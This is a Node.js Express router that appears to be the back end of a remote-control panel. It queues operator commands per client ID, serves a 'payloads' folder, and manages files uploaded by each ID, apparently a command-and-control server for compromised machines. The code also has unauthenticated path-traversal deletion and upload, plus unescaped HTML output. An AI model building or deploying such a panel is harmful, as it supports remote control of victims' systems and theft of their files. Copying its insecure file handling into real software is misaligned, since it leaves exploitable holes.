const express = require("express")
const app = express.Router()
const { LocalStorage } = require("node-localstorage")
const fs = require("fs")

app.get("/", (req, res) => {
    let id = req.query.id
    const book = new LocalStorage("./public/ssd/book")

    if (book.getItem(id) === null) {
        res.send("ID NOT FOUND")
    } else {
        res.render("panel", {
            id
        })
    }
})

app.post("/command", (req, res) => {
    let id = req.query.id
    const book = new LocalStorage("./public/ssd/book")
    let command = ""
    for (let key in req.body) {
        command += req.body[key] + "\n"
    }

    book.setItem(id, command)
    res.send("OK")
})

app.get("/files", (req, res) => {
    const { id } = req.query
    let tarPath = `${process.cwd()}/public/ssd/uploads/${id}`

    if (fs.existsSync(tarPath)) {
        let files = fs.readdirSync(tarPath)
        let payloads = fs.readdirSync(`${process.cwd()}/public/payloads`)

        let html = "<h3>payloads</h3>"
        for (let file of payloads) {
            html += `<div class="file">
            <a href="/payloads/${file}"><span>${file}</span></a>
            <div>
                <button id="copy">Copy</button>
            </div>
            </div>`
        }

        html += "<h3>uploads</h3>"
        for (let file of files) {
            html += `<div class="file">
            <a href="/ssd/uploads/${id}/${file}"><span>${file}</span></a>
            <div>
                <button id="copy">Copy</button>
                <button id="del" value="${file}">Delete</button>
            </div>
        </div>`
        }

        res.render("fm", {
            id,
            html
        })
    } else {
        res.send("ID NOT FOUND")
    }
})

app.post("/upload", (req, res) => {
    const { id } = req.query
    const book = new LocalStorage("./public/ssd/book")

    if (book.getItem(id)) {
        if (req.files) {
            let file = req.files.file
            file.mv(`${process.cwd()}/public/ssd/uploads/${id}/${file.name}`, (err) => {
                if (err) {
                    console.log(err)
                }
            })
        }

        res.send("OK")
    } else {
        res.send("ID NOT FOUND")
    }
})


app.get("/del", (req, res) => {
    const { id, file } = req.query
    try {
        let path = `${process.cwd()}/public/ssd/uploads/${id}/${file}`
        fs.unlinkSync(path)
        res.send("OK")
    } catch (err) {
        res.send("ERROR")
    }
})


module.exports = app